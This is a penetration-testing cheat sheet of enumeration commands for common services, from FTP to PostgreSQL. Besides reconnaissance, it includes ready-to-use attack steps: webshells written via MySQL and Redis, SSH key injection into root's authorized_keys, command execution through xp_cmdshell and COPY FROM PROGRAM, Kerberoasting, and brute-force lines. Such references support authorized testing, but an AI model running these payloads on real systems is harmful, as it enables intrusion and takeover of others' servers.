# Service Enumeration Reference

Comprehensive enumeration commands organized by service and port. Used as a companion to `scripts/recon.sh` for the manual Phase 2 deep-dive.

## Table of Contents

- [FTP (21)](#ftp-21)
- [SSH (22)](#ssh-22)
- [SMTP (25)](#smtp-25)
- [DNS (53)](#dns-53)
- [HTTP/HTTPS (80/443)](#httphttps-80443)
- [Kerberos (88)](#kerberos-88)
- [POP3 (110)](#pop3-110)
- [RPC (135)](#rpc-135)
- [NetBIOS/SMB (139/445)](#netbiossmb-139445)
- [IMAP (143)](#imap-143)
- [LDAP (389/636)](#ldap-389636)
- [MSSQL (1433)](#mssql-1433)
- [MySQL (3306)](#mysql-3306)
- [RDP (3389)](#rdp-3389)
- [WinRM (5985/5986)](#winrm-59855986)
- [Redis (6379)](#redis-6379)
- [PostgreSQL (5432)](#postgresql-5432)

---

## FTP (21)

```bash
# Banner grab
nc -nv <IP> 21

# Anonymous login
ftp <IP>
# Username: anonymous
# Password: anonymous (or any email)

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <IP>

# Download all files recursively
wget -r --no-passive ftp://anonymous:anonymous@<IP>/

# Check for writable directories (potential webshell upload)
ftp> put test.txt
```

---

## SSH (22)

```bash
# Banner grab
nc -nv <IP> 22
ssh -v <IP>

# Check authentication methods
ssh -o PreferredAuthentications=none <IP> 2>&1

# User enumeration (CVE-2018-15473)
python3 ssh_user_enum.py <IP> -w users.txt

# Brute force (use carefully — only on authorized targets)
hydra -L users.txt -P passwords.txt ssh://<IP>
```

---

## SMTP (25)

```bash
# Banner grab and manual commands
nc -nv <IP> 25
EHLO test
VRFY root
EXPN root

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>

# Nmap scripts
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay -p 25 <IP>

# Check for open relay
swaks --to user@example.com --from attacker@evil.com --server <IP>
```

---

## DNS (53)

```bash
# Zone transfer
dig axfr @<IP> <domain>
host -t axfr <domain> <IP>
dnsrecon -d <domain> -n <IP> -t axfr

# DNS enumeration
dnsrecon -d <domain> -n <IP>
dnsenum <domain>

# Reverse lookup
dnsrecon -r <IP-RANGE>/24 -n <IP>

# Nmap scripts
nmap --script dns-zone-transfer -p 53 <IP>
```

---

## HTTP/HTTPS (80/443)

```bash
# Technology fingerprinting
whatweb <URL>
curl -I <URL>

# Directory enumeration
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
feroxbuster -u <URL> -w <wordlist>
dirsearch -u <URL> -e php,txt,html

# Virtual host enumeration
gobuster vhost -u <URL> -w <wordlist>
ffuf -w <wordlist> -u <URL> -H "Host: FUZZ.<domain>"

# Subdomain enumeration
gobuster dns -d <domain> -w <wordlist>
wfuzz -c -w <wordlist> -u <URL> -H "Host: FUZZ.<domain>" --hc 404

# Vulnerability scanning
nikto -h <URL>
nuclei -u <URL>

# CMS detection
wpscan --url <URL>               # WordPress
droopescan scan drupal -u <URL>  # Drupal
joomscan -u <URL>                # Joomla

# SSL/TLS analysis
sslscan <IP>:443
sslyze <IP>:443
testssl.sh <URL>

# Screenshot
gowitness single <URL>
eyewitness --single <URL>
```

---

## Kerberos (88)

```bash
# User enumeration
kerbrute userenum -d <domain> --dc <IP> users.txt

# AS-REP Roasting (no pre-auth required)
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP> -format hashcat

# Kerberoasting (requires valid creds)
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request

# Nmap scripts
nmap --script krb5-enum-users --script-args krb5-enum-users.realm='<domain>' -p 88 <IP>
```

---

## POP3 (110)

```bash
# Banner grab
nc -nv <IP> 110

# Manual commands
USER <username>
PASS <password>
LIST
RETR 1

# Nmap scripts
nmap --script pop3-capabilities,pop3-ntlm-info -p 110 <IP>
```

---

## RPC (135)

```bash
# Endpoint enumeration
rpcdump.py <IP>
rpcinfo -p <IP>

# Impacket tools
lookupsid.py <domain>/<user>:<pass>@<IP>

# Nmap scripts
nmap --script msrpc-enum -p 135 <IP>
```

---

## NetBIOS/SMB (139/445)

```bash
# Share enumeration (null session)
smbclient -L //<IP> -N
smbmap -H <IP>
smbmap -H <IP> -u '' -p ''
crackmapexec smb <IP> --shares

# Full null session enumeration
rpcclient -U "" -N <IP>
enum4linux -a <IP>
enum4linux-ng -A <IP>

# User enumeration
crackmapexec smb <IP> --users
rpcclient -U "" -N <IP> -c "enumdomusers"

# Connect to share
smbclient //<IP>/<share> -N
smbclient //<IP>/<share> -U '<user>%<pass>'

# Download files recursively
smbget -R smb://<IP>/<share> -U '<user>%<pass>'

# With credentials
smbmap -H <IP> -u '<user>' -p '<pass>'
crackmapexec smb <IP> -u '<user>' -p '<pass>' --shares

# Vulnerability checks
nmap --script smb-vuln* -p 445 <IP>
nmap --script smb-vuln-ms17-010 -p 445 <IP>
```

---

## IMAP (143)

```bash
# Banner grab
nc -nv <IP> 143

# Manual commands
a1 LOGIN <user> <pass>
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1:* (FLAGS BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])

# Nmap scripts
nmap --script imap-capabilities,imap-ntlm-info -p 143 <IP>
```

---

## LDAP (389/636)

```bash
# Anonymous bind
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=<tld>"
ldapsearch -x -H ldap://<IP> -s base namingcontexts

# With credentials
ldapsearch -x -H ldap://<IP> -D '<user>@<domain>' -w '<pass>' -b "dc=<domain>,dc=<tld>"

# Dump all objects
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=<tld>" "(objectClass=*)"

# Enumerate users
ldapsearch -x -H ldap://<IP> -b "dc=<domain>,dc=<tld>" "(objectClass=user)" sAMAccountName

# Nmap scripts
nmap --script ldap-search,ldap-rootdse -p 389 <IP>

# Impacket
GetADUsers.py -all -dc-ip <IP> <domain>/<user>:<pass>
```

---

## MSSQL (1433)

```bash
# Connect
impacket-mssqlclient <user>:<pass>@<IP>
sqsh -S <IP> -U <user> -P <pass>

# Enable xp_cmdshell (if admin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Enumerate databases and tables
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;

# Nmap scripts
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 <IP>

# Brute force
hydra -L users.txt -P passwords.txt <IP> mssql
```

---

## MySQL (3306)

```bash
# Connect
mysql -h <IP> -u root
mysql -h <IP> -u root -p

# Enumerate
SHOW databases;
USE <database>;
SHOW tables;
SELECT * FROM <table>;

# File read (if FILE privilege granted)
SELECT LOAD_FILE('/etc/passwd');

# File write (if FILE privilege and writable path)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Nmap scripts
nmap --script mysql-info,mysql-enum,mysql-empty-password -p 3306 <IP>

# Brute force
hydra -L users.txt -P passwords.txt <IP> mysql
```

---

## RDP (3389)

```bash
# Connect
xfreerdp /u:<user> /p:<pass> /v:<IP>
rdesktop <IP>

# Nmap scripts
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <IP>

# BlueKeep check
nmap --script rdp-vuln-ms19-001 -p 3389 <IP>

# Brute force
hydra -L users.txt -P passwords.txt rdp://<IP>
crowbar -b rdp -s <IP>/32 -U users.txt -C passwords.txt
```

---

## WinRM (5985/5986)

```bash
# Connect with evil-winrm
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NTLM-hash>

# CrackMapExec
crackmapexec winrm <IP> -u <user> -p <pass>

# Brute force
crackmapexec winrm <IP> -u users.txt -p passwords.txt
```

---

## Redis (6379)

```bash
# Connect and enumerate
redis-cli -h <IP>
INFO
CONFIG GET *
KEYS *

# Potential RCE: write webshell if /var/www is writable
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET webshell "<?php system($_GET['cmd']); ?>"
SAVE

# SSH key injection (if /root/.ssh is writable)
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET ssh_key "<your_public_key>"
SAVE
```

---

## PostgreSQL (5432)

```bash
# Connect
psql -h <IP> -U postgres
psql -h <IP> -U postgres -d <database>

# Enumerate
\l            # List databases
\c <db>       # Connect to database
\dt           # List tables
\du           # List users

# File read
CREATE TABLE demo(t text);
COPY demo FROM '/etc/passwd';
SELECT * FROM demo;

# Command execution (requires superuser)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

# Nmap scripts
nmap --script pgsql-brute -p 5432 <IP>
```
